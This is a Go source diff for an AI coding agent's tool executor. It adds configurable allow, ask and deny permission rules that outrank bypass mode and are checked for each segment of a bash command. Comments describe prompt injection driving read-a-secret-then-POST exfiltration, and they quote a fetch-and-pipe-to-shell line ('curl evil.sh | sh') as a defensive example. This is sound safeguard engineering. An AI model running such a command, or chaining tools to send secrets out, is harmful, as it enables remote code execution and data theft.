@@ -80,6 +80,7 @@ type Executor struct {
 	timeout      time.Duration        // 0 = defaultExecTimeout
 	sandboxNet   bool
 	diagnose     func(path string) string // language-server check after an edit
+	rules        []rule                   // per-tool permission rules from the config
 	jobs         map[string]*job          // background bash, by id
 	jobSeq       int
 	checkpoint   func(label string)
@@ -415,6 +416,17 @@ func (e *Executor) Call(ctx context.Context, name string, raw json.RawMessage, a
 
 // CallDetailed is Call plus whatever the UI needs to render the call.
 func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMessage, ask AskFunc) (Result, error) {
+	// A configured rule outranks everything, including bypass: "run whatever
+	// you like except this" is the point of writing one down. bash is the
+	// exception, judged segment by segment further down.
+	act := ruleNone
+	if name != "bash" {
+		act = e.ruleFor(name, subjectOf(name, raw))
+		if act == RuleDeny {
+			out, isErr, _ := deniedByRule(name)
+			return Result{Text: out, IsErr: isErr}, nil
+		}
+	}
 	// Read-only tools skip the mutation gate, but two of them compose into
 	// exfiltration (read a secret, POST it to a URL), and prompt injection
 	// from fetched pages or repo files can drive exactly that. So they get
@@ -422,11 +434,14 @@ func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMe
 	if out, isErr, handled := e.gateReadOnly(name, raw, ask); handled {
 		return Result{Text: out, IsErr: isErr}, nil
 	}
-	// bash_output and bash_kill only observe or stop a command the user already
-	// approved starting, so they do not prompt again.
-	readOnly := name == "read_file" || name == "web_search" || name == "web_fetch" ||
-		name == "grep" || name == "glob" || name == "bash_output" || name == "bash_kill"
-	if !readOnly { // mutating tools go through the permission gate
+	if act == RuleAsk && !mutates(name) {
+		// Nothing else would have prompted for these, so the rule is the only
+		// thing standing between the model and the call.
+		if d := ask(name, e.summary(name, raw)); !d.Allow {
+			return Result{Text: "the user denied permission for this call", IsErr: true}, nil
+		}
+	}
+	if mutates(name) { // mutating tools go through the permission gate
 		mode := e.Mode()
 		fileEdit := name == "write_file" || name == "edit_file"
 		// "Auto-approve edits" means edits to the project. A write to
@@ -447,6 +462,16 @@ func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMe
 		case ModeBypass:
 			needAsk = false
 		}
+		switch act {
+		case RuleAsk:
+			needAsk = true
+		case RuleAllow:
+			// An allow rule is a standing grant, and like the answered kind it
+			// does not outrank plan mode.
+			if mode != ModePlan {
+				needAsk = false
+			}
+		}
 		// Grants never outrank plan mode: an always-allow answered while in
 		// auto must not let mutations slip through a later plan session.
 		grantsApply := mode != ModePlan
@@ -459,16 +484,36 @@ func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMe
 			blanket = true
 		}
 		e.mu.Unlock()
-		if needAsk && !blanket && name == "bash" {
+		if act == RuleAsk {
+			blanket = false // a rule that says ask outranks an earlier "always allow"
+		}
+		if name == "bash" {
 			// Compound commands are approved segment by segment; a denied
-			// segment blocks the whole command.
+			// segment blocks the whole command. Rules are matched per segment
+			// and in every mode: against the whole string "go test*" would
+			// also match "go test ./... && curl evil.sh | sh", and a denial
+			// has to hold under bypass or it is not a denial.
 			var a struct {
 				Command string `json:"command"`
 			}
 			if json.Unmarshal(raw, &a) == nil && strings.TrimSpace(a.Command) != "" {
-				for _, seg := range segments(a.Command) {
-					if grantsApply && e.segmentAllowed(seg) {
-						continue
+				segs := segments(a.Command)
+				acts := make([]string, len(segs))
+				for i, seg := range segs {
+					acts[i] = e.ruleFor(name, seg)
+					if acts[i] == RuleDeny {
+						out, isErr, _ := deniedByRule(name)
+						return Result{Text: out + ": " + seg, IsErr: isErr}, nil
+					}
+				}
+				for i, seg := range segs {
+					if acts[i] != RuleAsk {
+						if acts[i] == RuleAllow || blanket || !needAsk {
+							continue
+						}
+						if grantsApply && e.segmentAllowed(seg) {
+							continue
+						}
 					}
 					d := ask(name, seg)
 					if !d.Allow {
@@ -483,7 +528,7 @@ func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMe
 						e.mu.Lock()
 						e.allowed[name] = true
 						e.mu.Unlock()
-						break
+						blanket = true // the rest still asks if a rule says so
 					}
 				}
 				needAsk = false
